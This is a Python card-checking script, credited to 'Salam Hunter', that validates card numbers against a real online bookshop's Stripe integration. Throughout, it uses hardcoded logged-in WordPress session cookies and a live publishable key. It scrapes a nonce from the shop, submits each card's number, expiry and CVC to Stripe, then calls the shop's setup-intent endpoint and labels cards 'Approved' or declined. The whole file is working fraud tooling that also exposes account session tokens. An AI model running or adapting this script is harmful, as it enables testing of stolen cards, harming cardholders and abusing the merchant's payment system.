# by Salam Hunter @T5B55

import requests
import requests
import re
import requests
import requests,time
import random
import requests
import re,json
import random
import time
import string
import base64
from bs4 import BeautifulSoup
from user_agent import *
import random
import string
import requests
import requests,user_agent,re,base64,json,random
import requests
import pyfiglet
import time
import os
import webbrowser
from colorama import Fore
import string
from getuseragent import UserAgent
from user_agent import generate_user_agent
userr = generate_user_agent()

def br(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#salam hunter
		yy = yy.split("20")[1]
	with open('fileb3.txt', 'r') as file:
		first_line = file.readline()
	while True:
		lines='''hxhcdrr%7C1713641609%7CXOJGK2xFYyXD6Wom3p2Cujj2ZkzyHqXGk13kFuIl5z2%7Cedf540bbe280f3cab93eebcbdb30556e244f9cbfd6b72021d7ea61d6330bc024
jsnxuwv%7C1713641702%7CLuntNS8UCY3lTvN6Yq0pXDIWhRoQN6T2rIJcVUYHqrW%7C81172a53f2d4f6da23bb1b177581990c34ac15331baad10c4d3bad3500cd0559
bdjqisha%7C1713641764%7C6XL7TRIFD9CrHleBLzzCSt7ymVS4pAGUu5mYFW0s5XN%7C84adb5191193048c127086078a87c34bcf50e586791ccd976e5dd088b037346b
djdnsbba%7C1713641897%7CL5FleSTWtIImxvKpB3JvEdk09qZLTGEPUaxNadcBsno%7C7ebd4c043b84acda974813d5eaf330f62d91fad75f7ee3d0300f06abc52bcaf4'''
		lines = lines.strip().split('\n')
		random_line_number = random.randint(0, len(lines) - 1)
		big = lines[random_line_number]
		if big == first_line:
			pass
		else:
			break
	with open('fileb3.txt', 'w') as file:
		file.write(big)
	import base64,re
	import requests
	
	r = requests.session()
	
	cookies = {
    '__stripe_mid': 'da316130-6198-4c8e-b3db-6631cb50729b8fe9d4',
    'soundestID': '20240928143743-pex3nn09AaFjbZJmrf7uccQfLZL21rYAZN5XvIpMWeU2LbSNi',
    'omnisendSessionID': 'udNbcVaPgBoTYE-20240928143743',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-09-28%2014%3A37%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fgrovebooks.co.uk%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-09-28%2014%3A37%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fgrovebooks.co.uk%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    'omnisendContactID': '66f814f29d5dbdeb69ac075c',
    'wordpress_logged_in_25467f992b9dc4291143f953eb4ad82d': 'salabcm1234%7C1728743922%7CKtsv2SOmnPkmLnMy9oQZTK9f3g6s3FrLlg1IFg2PKbk%7C5db43e56f8e4fde010f59f38598f33a5050f324d823b078564c1f19b581baf87',
    'sbjs_session': 'pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fgrovebooks.co.uk%2Fmy-account%2Fpayment-methods%2F',
}
	
	headers = {
    'authority': 'grovebooks.co.uk',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    # 'cookie': '__stripe_mid=da316130-6198-4c8e-b3db-6631cb50729b8fe9d4; soundestID=20240928143743-pex3nn09AaFjbZJmrf7uccQfLZL21rYAZN5XvIpMWeU2LbSNi; omnisendSessionID=udNbcVaPgBoTYE-20240928143743; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-28%2014%3A37%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fgrovebooks.co.uk%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-28%2014%3A37%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fgrovebooks.co.uk%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; omnisendContactID=66f814f29d5dbdeb69ac075c; wordpress_logged_in_25467f992b9dc4291143f953eb4ad82d=salabcm1234%7C1728743922%7CKtsv2SOmnPkmLnMy9oQZTK9f3g6s3FrLlg1IFg2PKbk%7C5db43e56f8e4fde010f59f38598f33a5050f324d823b078564c1f19b581baf87; sbjs_session=pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fgrovebooks.co.uk%2Fmy-account%2Fpayment-methods%2F',
    'pragma': 'no-cache',
    'referer': 'https://grovebooks.co.uk/my-account/payment-methods/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	
	response = requests.get('https://grovebooks.co.uk/my-account/add-payment-method/', cookies=cookies, headers=headers)
	
	salam = re.search(r'add_card_nonce":"(.*?)"', response.text).group(1)
	
	headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	
	data = f'type=card&billing_details[name]=+&billing_details[email]=salabcm1234%40hi2.in&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=616b19ae-69af-4048-8e64-e03b6ad4dee64abb3a&muid=da316130-6198-4c8e-b3db-6631cb50729b8fe9d4&sid=7e46165f-e9f4-4bea-a342-ed50cbf1f3cb296f99&payment_user_agent=stripe.js%2Ffcb19dd0fc%3B+stripe-js-v3%2Ffcb19dd0fc%3B+split-card-element&referrer=https%3A%2F%2Fgrovebooks.co.uk&time_on_page=42169&key=pk_live_51NzehCLmgxp5otZ9j7dD7lHKKXZVuveilixD5PouXAjYLtkV4lsWk5gEJlBotnLrXfczguqoSKZOcDxo7N2lcGfx0059kz5xe5'

	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = response.json()['id']
	
	cookies = {
    '__stripe_mid': 'da316130-6198-4c8e-b3db-6631cb50729b8fe9d4',
    'soundestID': '20240928143743-pex3nn09AaFjbZJmrf7uccQfLZL21rYAZN5XvIpMWeU2LbSNi',
    'omnisendSessionID': 'udNbcVaPgBoTYE-20240928143743',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-09-28%2014%3A37%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fgrovebooks.co.uk%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-09-28%2014%3A37%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fgrovebooks.co.uk%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    'omnisendContactID': '66f814f29d5dbdeb69ac075c',
    'wordpress_logged_in_25467f992b9dc4291143f953eb4ad82d': 'salabcm1234%7C1728743922%7CKtsv2SOmnPkmLnMy9oQZTK9f3g6s3FrLlg1IFg2PKbk%7C5db43e56f8e4fde010f59f38598f33a5050f324d823b078564c1f19b581baf87',
    'sbjs_session': 'pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fgrovebooks.co.uk%2Fmy-account%2Fadd-payment-method%2F',
    '__stripe_sid': '7e46165f-e9f4-4bea-a342-ed50cbf1f3cb296f99',
}
	
	headers = {
    'authority': 'grovebooks.co.uk',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '__stripe_mid=da316130-6198-4c8e-b3db-6631cb50729b8fe9d4; soundestID=20240928143743-pex3nn09AaFjbZJmrf7uccQfLZL21rYAZN5XvIpMWeU2LbSNi; omnisendSessionID=udNbcVaPgBoTYE-20240928143743; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-28%2014%3A37%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fgrovebooks.co.uk%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-28%2014%3A37%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fgrovebooks.co.uk%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; omnisendContactID=66f814f29d5dbdeb69ac075c; wordpress_logged_in_25467f992b9dc4291143f953eb4ad82d=salabcm1234%7C1728743922%7CKtsv2SOmnPkmLnMy9oQZTK9f3g6s3FrLlg1IFg2PKbk%7C5db43e56f8e4fde010f59f38598f33a5050f324d823b078564c1f19b581baf87; sbjs_session=pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fgrovebooks.co.uk%2Fmy-account%2Fadd-payment-method%2F; __stripe_sid=7e46165f-e9f4-4bea-a342-ed50cbf1f3cb296f99',
    'origin': 'https://grovebooks.co.uk',
    'pragma': 'no-cache',
    'referer': 'https://grovebooks.co.uk/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

	
	params = {
    'wc-ajax': 'wc_stripe_create_setup_intent',
}
	
	data = {
    'stripe_source_id': pm,
    'nonce': salam,
}
	
	response = requests.post('https://grovebooks.co.uk/', params=params, cookies=cookies, headers=headers, data=data)
	
	text = response.text
	match = response.json()["status"]
	if match:
		result = response.json()["status"]
	else:
		if 'Payment method successfully added' in text or 'Nice! New payment method added' in text or 'success' in text:
			result = "Approved"
		elif 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
		elif 'Please wait for 20 seconds.' in text:
			result = "try again"
		else:
			result = "Error"
			print('er#')
	if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Insufficient Funds' in result or 'Invalid postal code and cvv' in result or 'Invalid postal code or street address' in result:
		return 'Approved'
	else:
		return result
		